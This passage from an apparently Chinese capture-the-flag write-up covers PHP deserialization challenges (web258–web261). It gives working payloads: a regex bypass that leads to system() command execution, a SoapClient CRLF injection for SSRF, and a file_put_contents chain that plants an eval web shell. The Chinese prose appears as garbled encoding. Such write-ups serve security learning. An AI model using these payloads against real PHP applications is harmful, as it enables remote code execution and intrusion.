punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¤šäº†æ­£åˆ™è¿‡æ»¤<code>/[oc]:\d+:/i</code> è¿˜æœ‰ä¸ªå°æ”¹åŠ¨ï¼Œ<strong>æŠŠåŸæ¥çš„privateæ”¹æˆäº†public</strong></p><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼<code>&#39;/[oc]:\d+:/i&#39;</code>å¯ä»¥åˆ†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†æ¥è§£é‡Šï¼š</p><ol><li><code>/</code>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸé€šå¸¸ä½¿ç”¨æ–œæ <code>/</code>æ¥æ ‡è®°ï¼Œä½†åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦<code>\</code>æ¥é¿å…ä¸å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è®°æ··æ·†ã€‚</li><li><code>[oc]</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œè¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒå¯ä»¥åŒ¹é…å­—æ¯<code>o</code>æˆ–<code>c</code>ã€‚</li><li><code>:</code>ï¼šè¿™ä¸ªå­—ç¬¦å­—é¢ä¸Šè¡¨ç¤ºå®ƒè‡ªå·±ï¼Œå³å†’å·ã€‚</li><li><code>\d+</code>ï¼š<code>\d</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä»»æ„ä¸€ä¸ªæ•°å­—ï¼ˆ0-9ï¼‰ã€‚<code>+</code>æ˜¯ä¸€ä¸ªé‡è¯ï¼Œè¡¨ç¤ºå‰é¢çš„å­—ç¬¦æˆ–å­—ç¬¦é›†å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚æ‰€ä»¥<code>\d+</code>è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ã€‚</li><li><code>:</code>ï¼šåŒä¸Šï¼Œè¡¨ç¤ºå­—é¢ä¸Šçš„å†’å·ã€‚</li><li><code>/i</code>ï¼š<code>i</code>æ˜¯ä¸€ä¸ªä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚è¿™æ„å‘³ç€<code>[oc]</code>å¯ä»¥åŒ¹é…<code>O</code>æˆ–<code>o</code>æˆ–<code>C</code>æˆ–<code>c</code>ã€‚</li></ol><p>å°†è¿™äº›éƒ¨åˆ†ç»„åˆèµ·æ¥ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥åŒ¹é…å½¢å¦‚<code>/o123:</code>æˆ–<code>/c456:</code>çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­<code>o</code>æˆ–<code>c</code>åé¢è·Ÿç€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œç„¶åæ˜¯ä¸€ä¸ªå†’å·ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥åŒ¹é…<code>/oc:12345/</code>æˆ–<code>/O987:</code>ã€‚</p><p>å¯ä»¥åˆ©ç”¨unserializeçš„ç‰¹æ€§åœ¨æ•°å­—å‰é¢åŠ ä¸Š <code>+</code> å³å¯ï¼Œè¿™é‡Œæ­£åˆ™æ›¿æ¢ä¸€ä¸‹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([oc]):(\d+:)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$1</span></span>:+<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span>fl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:+11:"ctfShowUser":1:&#123;s:5:"class";O:+8:"backDoor":1:&#123;s:4:"code";s:18:"system("tac fl*");";&#125;&#125;</span></code></pre><h4 id="web259-HTTP-SoapClient-CRLF-SSRF"><a href="#web259-HTTP-SoapClient-CRLF-SSRF" class="headerlink" title="web259(HTTP  SoapClient+CRLF+SSRF)"></a>web259(HTTP  SoapClient+CRLF+SSRF)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ²¡æ‰¾åˆ°å¯ä»¥ååºåˆ—åŒ–çš„ç±»ï¼Œä½†æ˜¯æ ¹æ®æç¤ºä¼ªé€ ipåè®¿é—®flag.txtå¯ä»¥å¾—åˆ°flagï¼Œæ„Ÿè§‰è€ƒçš„æ˜¯HTTP</p><p>çœ‹äº†å¤§ä½¬wpè€ƒçš„æ˜¯phpåŸç”Ÿç±»<code>SoapClient</code>+<code>CRLF</code>å®ç°<code>SSRF</code></p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">ä»ä¸€é“é¢˜å­¦ä¹ SoapClientä¸CRLFç»„åˆæ‹³</a></p><p><strong>CRLFæ³¨å…¥æ”»å‡»</strong></p><p>CRLFæ˜¯â€œå›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ï¼Œå…¶åå…­è¿›åˆ¶ç¼–ç åˆ†åˆ«ä¸º0x0då’Œ0x0aã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†</p><p>éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œ</p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ã€‚CRLFæ¼æ´å¸¸å‡ºç°åœ¨Locationä¸Set-cookieæ¶ˆæ¯å¤´ä¸­ã€‚</p><p><strong>æœ¬é¢˜éœ€è¦é‡ç‚¹å…³æ³¨çš„ææ„å‡½æ•°</strong></p><p><code>__call</code> åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨<br>åœ¨è¿™é“é¢˜ä¸­<code>$vip-&gt;getFlag();</code>å› ä¸ºè°ƒç”¨äº†ç±»ä¸­æ²¡æœ‰çš„æ–¹æ³•æ‰€ä»¥ä¼šå¯¼è‡´<code>__call</code>çš„æ‰§è¡Œ<br>æœ¬é¢˜éœ€è¦ç”¨åˆ°çš„å‡½æ•°<br><a href="https://www.php.net/manual/zh/soapclient.call.php">SoapClient::__call</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'hsad^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"ssrf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åºåˆ—åŒ–å‡ºæ¥çš„ä¸œè¥¿éœ€è¦åŒ…å«å­—ç¬¦ä¸²ctfshow_i_love_36Dï¼Œ<br>ç›´æ¥ä¼ ctfhsow&#x3D;ctfshow_i_love_36Dè¯•è¯•ï¼ŒæˆåŠŸå›æ˜¾flagã€‚</p><h4 id="web261-unserialize"><a href="#web261-unserialize" class="headerlink" title="web261(__unserialize)"></a>web261(__unserialize)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">PHP æ–‡æ¡£</a>ä¸­æåˆ°</p><blockquote><p>æ³¨æ„:<br>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº†<code> __unserialize()</code> å’Œ <code>__wakeup()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <code>__unserialize()</code> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<code>__wakeup() </code>æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚<br>æ³¨æ„:<br>æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</p></blockquote><p>æŸ¥çœ‹ <code>response header</code> å¯çŸ¥ <code>X-Powered-By: PHP/7.4.16</code>ï¼Œé‚£ä¹ˆ <code>__wakeup</code> éƒ¨åˆ†å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œä¸æ³¨é‡Šæ— å¼‚ã€‚<br><code>__destruct</code> å‡½æ•°éƒ¨åˆ†å¼±æ¯”è¾ƒ <code>$this-&gt;code==0x36d</code>ï¼Œå› ä¸º <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>ï¼Œ<code>username</code> å¯æ§åˆ¶ï¼Œå› ä¸º <code>(int)&#39;877.php&#39; == 0x36d</code>ï¼Œæ•…ä¼  <code>877.php</code> å³å¯ç»•è¿‡ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>vip<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowvip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22877.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token operator">%</span><span class="token number">40</span>eval<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B1<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token number">877.</span>php       <span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag_is_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web262-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web262-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" 